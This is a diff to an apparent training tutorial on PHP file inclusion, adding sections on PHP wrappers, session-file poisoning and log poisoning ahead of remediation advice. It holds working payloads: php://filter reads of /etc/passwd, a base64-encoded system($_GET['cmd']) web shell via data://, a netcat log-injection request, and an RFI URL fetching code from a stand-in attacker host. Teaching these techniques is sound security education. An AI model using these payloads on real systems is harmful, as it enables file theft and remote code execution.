@@ -148,6 +148,87 @@ Let's say that the attacker hosts a PHP file on their own server http://attacker
 
 First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.
 
+# PHP Wrappers
+PHP wrappers are part of PHP's functionality that allows users access to various data streams. Wrappers can also access or execute code through built-in PHP protocols, which may lead to significant security risks if not properly handled.
+
+For instance, an application vulnerable to LFI might include files based on a user-supplied input without sufficient validation. In such cases, attackers can use the `php://filter` filter. This filter allows a user to perform basic modification operations on the data before it's read or written. For example, if an attacker wants to encode the contents of an included file like `/etc/passwd` in base64. This can be achieved by using the `convert.base64-encode` conversion filter of the wrapper. The final payload will then be `php://filter/convert.base64-encode/resource=/etc/passwd`
+
+There are many categories of filters in PHP. Some of these are String Filters (string.rot13, string.toupper, string.tolower, and string.strip_tags), Conversion Filters (convert.base64-encode, convert.base64-decode, convert.quoted-printable-encode, and convert.quoted-printable-decode), Compression Filters (zlib.deflate and zlib.inflate), and Encryption Filters (mcrypt, and mdecrypt) which is now deprecated.
+
+For example, the table below represents the output of the target file **.htaccess** using the different string filters in PHP.
+
+| **Payload**                                           | **Output**                                   |
+| ----------------------------------------------------- | -------------------------------------------- |
+| php://filter/convert.base64-encode/resource=.htaccess | UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz |
+| php://filter/string.rot13/resource=.htaccess          | ErjevgrRatvar ba Bcgvbaf -Vaqrkrf            |
+| php://filter/string.toupper/resource=.htaccess        | REWRITEENGINE ON OPTIONS -INDEXES            |
+| php://filter/string.tolower/resource=.htaccess        | rewriteengine on options -indexes            |
+| php://filter/string.strip_tags/resource=.htaccess     | RewriteEngine on Options -Indexes            |
+| No filter applied                                     | RewriteEngine on Options -Indexes            |
+
+## Data Wrapper
+The data stream wrapper is another example of PHP's wrapper functionality. The `data://` wrapper allows inline data embedding. It is used to embed small amounts of data directly into the application code.
+Example payload: `data:text/plain,<?php%20phpinfo();%20?>`
+
+PHP wrappers can also be used not only for reading files but also for code execution. The key here is the `php://filter` stream wrapper, which enables file transformations on the fly. Take the PHP base64 filter as an example. This method allows attackers to execute arbitrary code on the server using a base64-encoded payload.
+
+Using the PHP code `<?php system($_GET['cmd']); echo 'Shell done!'; ?>` as our payload; the value of the payload, when encoded to base64, will be `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`
+
+|   |   |   |
+|---|---|---|
+|**Position**|**Field**|**Value**|
+|1|Protocol Wrapper|php://filter|
+|2|Filter|convert.base64-decode|
+|3|Resource Type|resource=|
+|4|Data Type|data://plain/text,|
+|5|Encoded Payload|PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+|
+
+In the table above, `PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+` is the base64-encoded version of the PHP code. When the server processes this request, it first decodes the base64 string and then executes the PHP code, allowing the attacker to run commands on the server via the "cmd" GET parameter.
+
+# PHP Session Files
+PHP session files can also be used in an LFI attack, leading to Remote Code Execution, particularly if an attacker can manipulate the session data. In a typical web application, session data is stored in files on the server. If an attacker can inject malicious code into these session files, and if the application includes these files through an LFI vulnerability, this can lead to code execution.
+
+For example, a vulnerable application contains the below code
+
+```php
+if(isset($_GET['page'])){
+    $_SESSION['page'] = $_GET['page'];
+    echo "You're currently in" . $_GET["page"];
+    include($_GET['page']);
+}
+```
+
+An attacker could exploit this vulnerability by injecting a PHP code into their session variable by using `<?php echo phpinfo(); ?>` in the page parameter.
+This code is then saved in the session file on the server. Subsequently, the attacker can use the LFI vulnerability to include this session file. Since session IDs are hashed, the ID can be found in the cookies section of your browser.
+Accessing the URL `sessions.php?page=/var/lib/php/sessions/sess_[sessionID]` will execute the injected PHP code in the session file. Note that you have to replace [sessionID] with the value from your PHPSESSID cookie.
+# Log Poisoning
+Log poisoning is a technique where an attacker injects executable code into a web server's log file and then uses an LFI vulnerability to include and execute this log file. This method is particularly stealthy because log files are shared and are a seemingly harmless part of web server operations. In a log poisoning attack, the attacker must first inject malicious PHP code into a log file. This can be done in various ways, such as crafting an evil user agent, sending a payload via URL using Netcat, or a referrer header that the server logs. Once the PHP code is in the log file, the attacker can exploit an LFI vulnerability to include it as a standard PHP file. This causes the server to execute the malicious code contained in the log file, leading to RCE.
+
+For example, if an attacker sends a Netcat request to the vulnerable machine containing a PHP code
+
+```php
+$ nc MACHINE_IP 80      
+<?php echo phpinfo(); ?>
+HTTP/1.1 400 Bad Request
+Date: Thu, 23 Nov 2023 05:39:55 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Length: 335
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>400 Bad Request</title>
+</head><body>
+<h1>Bad Request</h1>
+<p>Your browser sent a request that this server could not understand.<br />
+</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at MACHINE_IP.eu-west-1.compute.internal Port 80</address>
+</body></html>
+```
+
+The code will then be logged in the server's access logs. The attacker then uses LFI to include the access log file: `?page=/var/log/apache2/access.log`
 # Remediation
 As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:
 1. Keep system and services, including web application frameworks, updated with the latest version.
